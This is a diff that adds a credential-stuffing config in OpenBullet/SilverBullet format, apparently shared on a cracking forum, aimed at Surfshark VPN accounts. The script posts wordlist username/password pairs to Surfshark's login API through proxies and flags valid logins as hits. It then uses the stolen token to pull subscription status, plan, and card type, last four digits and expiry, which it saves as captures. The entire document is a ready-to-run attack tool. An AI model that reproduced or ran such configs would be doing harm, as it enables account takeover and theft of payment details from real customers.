@@ -1,0 +1,158 @@
+[SETTINGS]
+{
+  "Name": "SURFSHARK REVIVED API",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2023-10-15T01:50:54.2248925+06:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@MulaBhai",
+  "Version": "1.1.4 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": true,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Surfshark Revived Api Config by @hardyisopJr [Craxpro.io - Crax",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+REQUEST POST "https://ext.surfshark.com/v1/auth/login" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: ext.surfshark.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "pragma: no-cache" 
+  HEADER "x-device-version: 4.1.0" 
+  HEADER "x-device-type: extension" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36" 
+  HEADER "content-type: application/json" 
+  HEADER "x-device-brand: Chrome" 
+  HEADER "cache-control: no-cache" 
+  HEADER "x-device-model: Extension" 
+  HEADER "x-device-platform: windows" 
+  HEADER "x-device-id: cb98b39c-5648-40f6-879a-e36bd190d6df" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: chrome-extension://ailoabdmgclmfmhdagmlohpjlbpffblp" 
+  HEADER "Sec-Fetch-Site: none" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 56" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "401" 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" Contains "200" 
+    KEY "{\"token\":\"" 
+  KEYCHAIN Retry OR 
+    KEY "<RESPONSECODE>" Contains "429" 
+    KEY "Access denied" 
+
+PARSE "<SOURCE>" LR "{\"token\":\"" "\"" -> VAR "atk" 
+
+REQUEST GET "https://api.sir90hl.com/v1/payment/subscriptions/current" 
+  
+  HEADER "Host: api.sir90hl.com" 
+  HEADER "Cookie: __cflb=02DiuEJCGiiFg9VyaaqFoYPyCSvbTB1ABgQnAgnPySvWQ" 
+  HEADER "Accept: application/json" 
+  HEADER "Ss-Variant-Slugs: feature_1:b;feature_chat_apple:b;feature_shadowsocks:b;feature_mtls:b;feature_delete_account:b;feature_rotator:b;feature_cf_captcha:b;feature_ikev2_removal_warning:a;test_77:a;feature_proxy_self_heal:b;feature_auth_microsoft:a;feature_auth_google:b;feature_auth_apple:b;test_85:a;feature_login_apple_validation:b;feature_startup_apple_validation:b;feature_language_tooltip:a;feature_language_removal:b;test_93:a;feature_global_timeout:b;feature_acc_link_multiple:a;feature_location_prefetch:b;feature_blocked_port_mode:b;test_97:b;feature_dedicated_ip:b;test_windows:b;feature_local_net:b;feature_local_net_apple:d;feature_local_net_apple_ipv6:a;feature_blocked_port_mode_apple:b;test_subscription_plan_config_android:a" 
+  HEADER "Accept-Charset: utf-8" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: Surfshark/3.12.1 (com.surfshark.vpnclient.ios; build:2; iOS 16.6.0) Alamofire/5.4.3 device/mobile" 
+  HEADER "Accept-Language: en-IN;q=1.0, es-IN;q=0.9" 
+  HEADER "Authorization: Bearer <atk>" 
+
+PARSE "<SOURCE>" LR "\"name\":\"" "\"" CreateEmpty=FALSE -> CAP "Plan" 
+
+PARSE "<SOURCE>" LR "\"status\":\"" "\"" CreateEmpty=FALSE -> CAP "Status" 
+
+PARSE "<SOURCE>" LR "\"renewable\":" "," CreateEmpty=FALSE -> CAP "Renewable" 
+
+PARSE "<SOURCE>" LR "\"invoiceable\":" "," CreateEmpty=FALSE -> CAP "Invoice" 
+
+PARSE "<SOURCE>" LR "\"invoiceable\":<Invoice>,\"type\":\"" "\"" CreateEmpty=FALSE -> CAP "Payment Method" 
+
+PARSE "<SOURCE>" LR "\"cardType\":\"" "\"" Recursive=TRUE -> VAR "Card Type" 
+
+PARSE "<SOURCE>" LR "\"cardLastNumber\":\"" "\"" Recursive=TRUE -> VAR "CC Last 4 Digits" 
+
+PARSE "<SOURCE>" LR "\"cardExpiredYear\":\"" "\"" Recursive=TRUE -> VAR "CC Expiry Year" 
+
+PARSE "<SOURCE>" LR "\"cardExpiredMonth\":\"" "\"" Recursive=TRUE -> VAR "CC Expiry Month" 
+
+PARSE "<SOURCE>" LR "\"expiresAt\":\"" "T" -> VAR "exp" 
+
+FUNCTION Constant "<Card Type>,<CC Last 4 Digits>,<CC Expiry Month>/<CC Expiry Year>" -> CAP "Card Details" 
+
+FUNCTION DateToUnixTime "yyyy-MM-dd" "<exp>" -> VAR "ex" 
+
+FUNCTION CurrentUnixTime -> VAR "curnix" 
+
+FUNCTION Compute "(<ex>-<curnix>)/86400" -> VAR "days" 
+
+FUNCTION Round "<days>" -> CAP "Days Left" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success AND 
+    KEY "<Status>" DoesNotContain "canceled" 
+    KEY "<Days Left>" GreaterThan "0" 
+    KEY "<Days Left>" NotEqualTo "0" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<Status>" Contains "canceled" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Days Left>" EqualTo "0" 
+    KEY "<Days Left>" LessThan "1" 
+    KEY "<Days Left>" LessThan "0" 
+    KEY "<Days Left>" LessThanOrEqual "0" 
+    KEY "<RESPONSECODE>" Contains "204" 
+
+FUNCTION Constant "MulaBhai" -> CAP "Config by:" 
+
